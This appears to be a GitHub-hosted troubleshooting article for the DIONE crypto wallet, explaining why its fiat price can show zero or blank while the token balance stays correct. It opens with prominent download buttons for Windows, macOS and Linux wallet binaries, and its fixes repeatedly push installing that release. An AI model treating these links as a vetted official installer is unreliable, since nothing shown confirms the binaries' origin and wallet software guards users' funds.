![DIONE Wallet](assets/banner-article.png)

# DIONE Wallet Price Not Loading or Showing Zero

<p align="center">A missing number that changes nothing</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="assets/button-windows.png" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

A missing price in DIONE Wallet affects the fiat value only, never the token balance. The wallet reads a price feed and multiplies your balance by it; when the feed fails, the value can show zero, stale, or blank while the amount of DIONE is exactly right. Checking the token balance on OdysseyScan tells you which of the two you are looking at.

## Two numbers, one of which can lie

The wallet displays a token amount and a fiat estimate. The token amount comes from the chain and is as reliable as the connection. The fiat estimate comes from a price source and is only as good as that source at that moment.

That is why "my wallet shows zero" needs one question before any fix: is the DIONE amount zero, or is only the dollar figure zero? If the token count is correct, nothing has happened to your funds and the rest of this page applies. If the token count is zero, the cause is elsewhere - [DIONE Wallet Balance Shows Zero: Causes and Fixes](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-balance-shows-zero.md) covers it.

## Why a price feed fails

- **The feed is unreachable.** A blocked request, an offline machine or a filtered DNS leaves the price blank while the chain read still works.
- **The feed returns nothing for the pair.** A thin market can have no recent trade to quote, and a feed that refuses to serve a stale number shows nothing instead.
- **The build is behind.** Price fallbacks change between releases; an older build can fail where the current release falls back to a second source.
- **The active network changed.** A custom network added for another chain has its own tokens and no DIONE price.

The fourth is the one that surprises people, because the wallet looks normal and simply values everything at nothing.

## What the fallback is for

DIONE Wallet carries direct price fallbacks so that a single source failing does not blank the portfolio. When the fallback also fails, the honest display is empty rather than a confident wrong number - which is the behaviour to prefer, even though it looks like a fault.

A wrong number is worse than no number here: a stale price shown as current can prompt a decision about a balance that is not accurate. That is why the wallet would rather show nothing.

## Confirm the real balance first

Open OdysseyScan, look up the address and read the token balance. If it matches the wallet's DIONE figure, the only thing missing is the valuation, and nothing you do next risks funds.

If the token figure differs, the question moves to the chain read rather than the price, and [DIONE Wallet Not Syncing: What to Check First](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-not-syncing.md) is the right page.

## Fixes that work, in order

1. Install the current release from the releases page, then reopen the app.
2. Confirm the machine has a working connection - a browser test on the explorer is enough.
3. Switch the active network back to Odyssey Chain if a custom one was added.
4. Let the app resync rather than leaving it in the background, then check again.

In most reports, the first step resolves it. A wallet that is behind is the common cause of a permanently blank valuation on hardware that is otherwise fine.

## What a missing price does not mean

It does not mean the token is worthless, delisted or frozen. Price display and market listing are separate things: the wallet is a viewer, and a feed outage says nothing about the asset. Readers asking where DIONE trades should look at [Where to Buy DIONE Coin](https://github.com/dione-protocol/keys-and-transfers/blob/main/where-to-buy-dione-coin.md), and readers asking what the record shows should look at [DIONE Coin Price and All-Time High: What the Record Shows](https://github.com/dione-protocol/keys-and-transfers/blob/main/dione-coin-price-and-all-time-high.md), which states the published figures rather than a forecast.

It also does not mean the balance is at risk. Nothing in a price failure touches keys, signatures or the chain.

## When the number is wrong rather than absent

A plausible but incorrect valuation is a different defect from an empty one, and it deserves a bug report rather than a workaround: note the token balance, the displayed value, and the time, then report it through [Get Help From DIONE Wallet Support](https://github.com/dione-protocol/keys-and-transfers/blob/main/get-help-from-dione-wallet-support.md). A stale cached price shown without a marker is exactly the kind of report that gets fixed quickly, because it misleads rather than merely inconveniences.

Do not send funds to test whether the price is right. The chain is the authority, and the explorer already tells you the balance.

## Keep the install current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

Price handling is one of the areas that changes most between builds, including the fallback path that decides what the portfolio shows when a source is unavailable. Install from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) before treating a blank valuation as a defect, and report a wrong valuation through support rather than living with it.

## FAQ

### Why does my DIONE show a dollar value of zero?

The price feed failed, not the balance. The DIONE amount comes from the chain; the fiat value is a separate multiplication and can be empty while your tokens are exactly where they were.

### Is the price wrong or is my balance wrong?

Compare the token amount with OdysseyScan. If they match, only the valuation is affected; if they differ, the chain read is the problem.

### Does a missing price mean the token is delisted?

No. A feed outage says nothing about listing or value. Where DIONE trades is a separate question with its own answer.

### How do I make the price load again?

Install the current release, confirm the connection, return the active network to Odyssey Chain and let the wallet resync. One of those four resolves almost every report.

A blank valuation is the least damaging fault in this set: it hides a number rather than changing one. If the token balance is also wrong, start at [DIONE Wallet Balance Shows Zero: Causes and Fixes](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-balance-shows-zero.md); if the app cannot reach the network at all, [DIONE Wallet Stuck on Connecting](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-stuck-on-connecting.md); and if you are looking at a figure that is present but stale, report it with times and amounts through [Get Help From DIONE Wallet Support](https://github.com/dione-protocol/keys-and-transfers/blob/main/get-help-from-dione-wallet-support.md) so it can be traced.
